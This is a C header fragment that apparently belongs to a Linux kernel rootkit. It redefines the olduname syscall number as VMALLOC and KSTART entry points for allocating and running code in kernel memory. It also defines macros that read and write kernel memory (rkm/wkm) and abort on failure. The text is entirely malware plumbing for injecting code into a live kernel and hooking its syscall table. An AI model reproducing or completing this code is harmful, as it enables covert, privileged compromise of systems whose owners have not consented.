#include <unistd.h>
#define __NR_VMALLOC	__NR_olduname
#define __NR_KSTART	__NR_VMALLOC
#define __NR_VMALLOC6	__NR_VMALLOC
#define __NR_VMALLOC4	__NR_VMALLOC

inline _syscall3(unsigned long,VMALLOC4,unsigned long,size, unsigned long, gfp,unsigned long,protection);
__attribute__((regparm(3))) inline _syscall2(unsigned long ,KSTART,unsigned long, mem,unsigned long, sct);
__attribute__((regparm(3))) inline _syscall1(unsigned long,VMALLOC6,unsigned long,size);
__attribute__((regparm(3))) inline _syscall1(int ,oldolduname,void *, mem);
#define MSGR	"D'ho! Unable to perform read operation!\n"
#define MSGW	"D'ho! Unable to perform write operation!\n"
#define ERROR(x,args...)	   { printf(x,##args);exit(-1);}
#define rce(fd,offset,dove,quanto) if(rkm(fd,offset,dove,quanto)<0) ERROR(MSGR) 
#define wce(fd,offset,dove,quanto) if(wkm(fd,offset,dove,quanto)<0) ERROR(MSGW)
